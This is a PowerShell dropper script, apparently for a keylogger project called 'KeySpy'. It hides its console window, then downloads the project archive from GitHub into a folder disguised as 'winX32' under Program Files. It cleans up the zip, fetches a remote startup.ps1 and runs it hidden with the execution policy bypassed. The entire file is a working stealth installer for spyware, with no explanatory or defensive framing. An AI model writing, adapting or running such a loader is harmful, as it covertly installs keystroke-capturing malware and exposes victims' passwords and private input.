Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
# Hide the window
[Console.Window]::ShowWindow($consolePtr, 0)

# Define the URL of the zip file
$zipUrl = "https://github.com/3rr0r-505/KeySpy/archive/a5792dc2827315c545185671445f0112bd751264.zip"

# Define the destination folder
$destinationFolder = "C:\Program Files (x86)\winX32"
$destinationPSFolder = "C:\Program Files (x86)\winX32\psScript"

# Create the destination folder if it doesn't exist
if (-not (Test-Path -Path $destinationFolder)) {
    New-Item -ItemType Directory -Path $destinationFolder | Out-Null
}

if (-not (Test-Path -Path $destinationPSFolder)) {
    New-Item -ItemType Directory -Path $destinationPSFolder | Out-Null
}

# Download the zip file
Invoke-WebRequest -Uri $zipUrl -OutFile "$destinationFolder\KeySpy.zip" -UseBasicParsing

# Unzip the contents silently and move them directly to the desired location
Expand-Archive -Path "$destinationFolder\KeySpy.zip" -DestinationPath $destinationFolder -Force

# Remove the subfolder created by GitHub in the extraction process
$extractedFolder = Get-ChildItem -Path $destinationFolder -Directory | Where-Object { $_.Name -like "KeySpy-*" }
Move-Item -Path "$destinationFolder\$($extractedFolder.Name)\*" -Destination $destinationFolder -Force
Remove-Item -Path "$destinationFolder\$($extractedFolder.Name)" -Recurse -Force

# Clean up: Remove the zip file
Remove-Item "$destinationFolder\KeySpy.zip" -Force

# Download the startup.ps1 file and save it in the same folder
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/startup.ps1" -OutFile "$destinationPSFolder\startup.ps1" -UseBasicParsing

# Execute the startup.ps1 script silently
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$destinationPSFolder\startup.ps1'" -NoNewWindow -Wait

Write-Host "Initial script execution completed successfully."

